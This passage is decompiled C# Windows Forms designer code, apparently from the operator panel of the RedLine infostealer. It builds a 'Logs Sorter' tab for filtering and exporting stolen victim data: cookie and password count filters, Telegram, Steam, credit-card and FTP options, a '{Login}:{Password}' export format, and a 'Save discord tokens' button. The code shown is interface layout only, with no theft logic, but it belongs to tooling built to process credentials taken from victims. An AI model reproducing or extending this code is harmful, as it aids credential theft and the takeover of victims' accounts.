		((System.Windows.Forms.DataGridViewBand)this.filterDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.filterDataGridViewTextBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.visibleDataGridViewCheckBoxColumn).DataPropertyName = "Visible";
		((System.Windows.Forms.DataGridViewColumn)this.visibleDataGridViewCheckBoxColumn).HeaderText = "Visible";
		((System.Windows.Forms.DataGridViewColumn)this.visibleDataGridViewCheckBoxColumn).Name = "visibleDataGridViewCheckBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.visibleDataGridViewCheckBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.visibleDataGridViewCheckBoxColumn).Visible = false;
		((System.Windows.Forms.BindingSource)this.object_11).DataSource = typeof(RedLine.SharedModels.RemoteTask);
		((System.Windows.Forms.Control)this.sorterTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.loadConfigBtn);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.saveConfigBtn);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.cookiesMoreThan);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label54);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.passMoreThan);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label55);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.saveDiscordTokensBtn);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.dataFormatSavingTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label42);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.fileNamesToSearchTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label41);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.steamFilesCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label39);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.findTgCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label37);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.saveFtpAccountsBtn);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.removeCheckedLogsBtn);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.removeEmptyLogsBtn);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.logDateToDTP);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.logDateFromDTP);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleSkipCheckedSortCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label35);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleRefreshDomainDetectSortCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label32);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f8);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f9);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.fa);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.fb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f1);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.eb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ec);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ed);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ee);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ef);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.f0);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.e9);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.ea);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.e7);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.e8);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.de);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.df);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.c6);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.c7);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a2);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a3);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.sortDomain);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.domainsTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a0);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.m_a1);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleOsSortTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label17);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleFilesSortCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label16);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleFtpsSortCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label15);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleAfSortCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label14);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCCsSortCb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label13);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCountrySortTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleSort);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCookieSortTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label12);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider12);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singlePasswordSortTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label11);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleCommentSortTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label10);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleIdSortTb);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label9);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.label8);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.singleStatusLbl);
		((System.Windows.Forms.Control)this.sorterTab).Controls.Add((System.Windows.Forms.Control)this.metroSetLabel1);
		((System.Windows.Forms.Control)this.sorterTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.sorterTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.sorterTab).Name = "sorterTab";
		((System.Windows.Forms.Control)this.sorterTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.sorterTab).TabIndex = 13;
		((System.Windows.Forms.Control)this.sorterTab).Text = "Logs Sorter";
		((MetroSetButton)this.loadConfigBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.loadConfigBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.loadConfigBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.loadConfigBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.loadConfigBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.loadConfigBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.loadConfigBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.loadConfigBtn).Location = new System.Drawing.Point(32, 612);
		((System.Windows.Forms.Control)this.loadConfigBtn).Name = "loadConfigBtn";
		((MetroSetButton)this.loadConfigBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.loadConfigBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.loadConfigBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.loadConfigBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.loadConfigBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.loadConfigBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.loadConfigBtn).Size = new System.Drawing.Size(147, 23);
		((MetroSetButton)this.loadConfigBtn).Style = (Style)0;
		((MetroSetButton)this.loadConfigBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.loadConfigBtn).TabIndex = 392;
		((System.Windows.Forms.Control)this.loadConfigBtn).Text = "Load config";
		((MetroSetButton)this.loadConfigBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.loadConfigBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.loadConfigBtn).Click += new System.EventHandler(loadConfigBtn_Click);
		((MetroSetButton)this.saveConfigBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveConfigBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveConfigBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.saveConfigBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.saveConfigBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveConfigBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveConfigBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveConfigBtn).Location = new System.Drawing.Point(31, 583);
		((System.Windows.Forms.Control)this.saveConfigBtn).Name = "saveConfigBtn";
		((MetroSetButton)this.saveConfigBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveConfigBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveConfigBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.saveConfigBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveConfigBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveConfigBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveConfigBtn).Size = new System.Drawing.Size(147, 23);
		((MetroSetButton)this.saveConfigBtn).Style = (Style)0;
		((MetroSetButton)this.saveConfigBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.saveConfigBtn).TabIndex = 391;
		((System.Windows.Forms.Control)this.saveConfigBtn).Text = "Save config";
		((MetroSetButton)this.saveConfigBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.saveConfigBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.saveConfigBtn).Click += new System.EventHandler(saveConfigBtn_Click);
		((System.Windows.Forms.Control)this.cookiesMoreThan).Location = new System.Drawing.Point(355, 302);
		((System.Windows.Forms.NumericUpDown)this.cookiesMoreThan).Maximum = new decimal(new int[4] { 10000, 0, 0, 0 });
		((System.Windows.Forms.NumericUpDown)this.cookiesMoreThan).Minimum = new decimal(new int[4] { 1, 0, 0, -2147483648 });
		((System.Windows.Forms.Control)this.cookiesMoreThan).Name = "cookiesMoreThan";
		((System.Windows.Forms.Control)this.cookiesMoreThan).Size = new System.Drawing.Size(44, 20);
		((System.Windows.Forms.Control)this.cookiesMoreThan).TabIndex = 390;
		((System.Windows.Forms.NumericUpDown)this.cookiesMoreThan).Value = new decimal(new int[4] { 1, 0, 0, -2147483648 });
		((System.Windows.Forms.Control)this.label54).AutoSize = true;
		((System.Windows.Forms.Control)this.label54).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label54).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label54).Location = new System.Drawing.Point(196, 303);
		((System.Windows.Forms.Control)this.label54).Name = "label54";
		((System.Windows.Forms.Control)this.label54).Size = new System.Drawing.Size(87, 15);
		((System.Windows.Forms.Control)this.label54).TabIndex = 389;
		((System.Windows.Forms.Control)this.label54).Text = "Cookies > than";
		((System.Windows.Forms.Control)this.passMoreThan).Location = new System.Drawing.Point(135, 302);
		((System.Windows.Forms.NumericUpDown)this.passMoreThan).Maximum = new decimal(new int[4] { 10000, 0, 0, 0 });
		((System.Windows.Forms.NumericUpDown)this.passMoreThan).Minimum = new decimal(new int[4] { 1, 0, 0, -2147483648 });
		((System.Windows.Forms.Control)this.passMoreThan).Name = "passMoreThan";
		((System.Windows.Forms.Control)this.passMoreThan).Size = new System.Drawing.Size(44, 20);
		((System.Windows.Forms.Control)this.passMoreThan).TabIndex = 388;
		((System.Windows.Forms.NumericUpDown)this.passMoreThan).Value = new decimal(new int[4] { 1, 0, 0, -2147483648 });
		((System.Windows.Forms.Control)this.label55).AutoSize = true;
		((System.Windows.Forms.Control)this.label55).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label55).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label55).Location = new System.Drawing.Point(27, 303);
		((System.Windows.Forms.Control)this.label55).Name = "label55";
		((System.Windows.Forms.Control)this.label55).Size = new System.Drawing.Size(100, 15);
		((System.Windows.Forms.Control)this.label55).TabIndex = 387;
		((System.Windows.Forms.Control)this.label55).Text = "Passwords > then";
		((MetroSetButton)this.saveDiscordTokensBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveDiscordTokensBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveDiscordTokensBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.saveDiscordTokensBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveDiscordTokensBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveDiscordTokensBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Location = new System.Drawing.Point(253, 612);
		((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Name = "saveDiscordTokensBtn";
		((MetroSetButton)this.saveDiscordTokensBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveDiscordTokensBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveDiscordTokensBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.saveDiscordTokensBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveDiscordTokensBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveDiscordTokensBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Size = new System.Drawing.Size(147, 23);
		((MetroSetButton)this.saveDiscordTokensBtn).Style = (Style)0;
		((MetroSetButton)this.saveDiscordTokensBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.saveDiscordTokensBtn).TabIndex = 161;
		((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Text = "Save discord tokens";
		((MetroSetButton)this.saveDiscordTokensBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.saveDiscordTokensBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.saveDiscordTokensBtn).Click += new System.EventHandler(saveDiscordTokensBtn_Click);
		((AnimaTextBox)this.dataFormatSavingTb).Dark = false;
		((System.Windows.Forms.Control)this.dataFormatSavingTb).Location = new System.Drawing.Point(565, 557);
		((AnimaTextBox)this.dataFormatSavingTb).MaxLength = 32767;
		((AnimaTextBox)this.dataFormatSavingTb).MultiLine = false;
		((System.Windows.Forms.Control)this.dataFormatSavingTb).Name = "dataFormatSavingTb";
		((AnimaTextBox)this.dataFormatSavingTb).Numeric = false;
		((AnimaTextBox)this.dataFormatSavingTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.dataFormatSavingTb).Size = new System.Drawing.Size(206, 23);
		((System.Windows.Forms.Control)this.dataFormatSavingTb).TabIndex = 160;
		((AnimaTextBox)this.dataFormatSavingTb).Text = "{Login}:{Password}";
		((AnimaTextBox)this.dataFormatSavingTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label42).AutoSize = true;
		((System.Windows.Forms.Control)this.label42).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label42).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label42).Location = new System.Drawing.Point(511, 560);
		((System.Windows.Forms.Control)this.label42).Name = "label42";
		((System.Windows.Forms.Control)this.label42).Size = new System.Drawing.Size(48, 15);
		((System.Windows.Forms.Control)this.label42).TabIndex = 159;
		((System.Windows.Forms.Control)this.label42).Text = "Format:";
		((AnimaTextBox)this.fileNamesToSearchTb).Dark = false;
		((System.Windows.Forms.Control)this.fileNamesToSearchTb).Location = new System.Drawing.Point(194, 275);
		((AnimaTextBox)this.fileNamesToSearchTb).MaxLength = 32767;
		((AnimaTextBox)this.fileNamesToSearchTb).MultiLine = false;
		((System.Windows.Forms.Control)this.fileNamesToSearchTb).Name = "fileNamesToSearchTb";
		((AnimaTextBox)this.fileNamesToSearchTb).Numeric = false;
		((AnimaTextBox)this.fileNamesToSearchTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.fileNamesToSearchTb).Size = new System.Drawing.Size(206, 23);
		((System.Windows.Forms.Control)this.fileNamesToSearchTb).TabIndex = 158;
		((AnimaTextBox)this.fileNamesToSearchTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label41).AutoSize = true;
		((System.Windows.Forms.Control)this.label41).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label41).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label41).Location = new System.Drawing.Point(28, 278);
		((System.Windows.Forms.Control)this.label41).Name = "label41";
		((System.Windows.Forms.Control)this.label41).Size = new System.Drawing.Size(117, 15);
		((System.Windows.Forms.Control)this.label41).TabIndex = 157;
		((System.Windows.Forms.Control)this.label41).Text = "File names to search:";
		((System.Windows.Forms.Control)this.steamFilesCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.steamFilesCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.steamFilesCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.steamFilesCb).Checked = false;
		((MetroSetCheckBox)this.steamFilesCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.steamFilesCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.steamFilesCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.steamFilesCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.steamFilesCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.steamFilesCb).Location = new System.Drawing.Point(162, 444);
		((System.Windows.Forms.Control)this.steamFilesCb).Name = "steamFilesCb";
		((MetroSetCheckBox)this.steamFilesCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.steamFilesCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.steamFilesCb).Style = (Style)1;
		((MetroSetCheckBox)this.steamFilesCb).StyleManager = null;
		((System.Windows.Forms.Control)this.steamFilesCb).TabIndex = 156;
		((MetroSetCheckBox)this.steamFilesCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.steamFilesCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label39).AutoSize = true;
		((System.Windows.Forms.Control)this.label39).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label39).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label39).Location = new System.Drawing.Point(28, 444);
		((System.Windows.Forms.Control)this.label39).Name = "label39";
		((System.Windows.Forms.Control)this.label39).Size = new System.Drawing.Size(43, 15);
		((System.Windows.Forms.Control)this.label39).TabIndex = 155;
		((System.Windows.Forms.Control)this.label39).Text = "Steam:";
		((System.Windows.Forms.Control)this.findTgCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.findTgCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.findTgCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.findTgCb).Checked = false;
		((MetroSetCheckBox)this.findTgCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.findTgCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.findTgCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.findTgCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.findTgCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.findTgCb).Location = new System.Drawing.Point(381, 421);
		((System.Windows.Forms.Control)this.findTgCb).Name = "findTgCb";
		((MetroSetCheckBox)this.findTgCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.findTgCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.findTgCb).Style = (Style)1;
		((MetroSetCheckBox)this.findTgCb).StyleManager = null;
		((System.Windows.Forms.Control)this.findTgCb).TabIndex = 154;
		((MetroSetCheckBox)this.findTgCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.findTgCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label37).AutoSize = true;
		((System.Windows.Forms.Control)this.label37).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label37).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label37).Location = new System.Drawing.Point(198, 421);
		((System.Windows.Forms.Control)this.label37).Name = "label37";
		((System.Windows.Forms.Control)this.label37).Size = new System.Drawing.Size(60, 15);
		((System.Windows.Forms.Control)this.label37).TabIndex = 153;
		((System.Windows.Forms.Control)this.label37).Text = "Telegram:";
		((MetroSetButton)this.saveFtpAccountsBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveFtpAccountsBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveFtpAccountsBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.saveFtpAccountsBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.saveFtpAccountsBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveFtpAccountsBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveFtpAccountsBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveFtpAccountsBtn).Location = new System.Drawing.Point(253, 583);
		((System.Windows.Forms.Control)this.saveFtpAccountsBtn).Name = "saveFtpAccountsBtn";
		((MetroSetButton)this.saveFtpAccountsBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveFtpAccountsBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveFtpAccountsBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.saveFtpAccountsBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveFtpAccountsBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveFtpAccountsBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveFtpAccountsBtn).Size = new System.Drawing.Size(147, 23);
		((MetroSetButton)this.saveFtpAccountsBtn).Style = (Style)0;
		((MetroSetButton)this.saveFtpAccountsBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.saveFtpAccountsBtn).TabIndex = 152;
		((System.Windows.Forms.Control)this.saveFtpAccountsBtn).Text = "Save all ftps";
		((MetroSetButton)this.saveFtpAccountsBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.saveFtpAccountsBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.saveFtpAccountsBtn).Click += new System.EventHandler(saveFtpAccountsBtn_Click);
		((MetroSetButton)this.removeCheckedLogsBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeCheckedLogsBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.removeCheckedLogsBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.removeCheckedLogsBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.removeCheckedLogsBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeCheckedLogsBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.removeCheckedLogsBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeCheckedLogsBtn).Location = new System.Drawing.Point(253, 554);
		((System.Windows.Forms.Control)this.removeCheckedLogsBtn).Name = "removeCheckedLogsBtn";
		((MetroSetButton)this.removeCheckedLogsBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeCheckedLogsBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.removeCheckedLogsBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.removeCheckedLogsBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeCheckedLogsBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.removeCheckedLogsBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.removeCheckedLogsBtn).Size = new System.Drawing.Size(147, 23);
		((MetroSetButton)this.removeCheckedLogsBtn).Style = (Style)0;
		((MetroSetButton)this.removeCheckedLogsBtn).StyleManager = null;
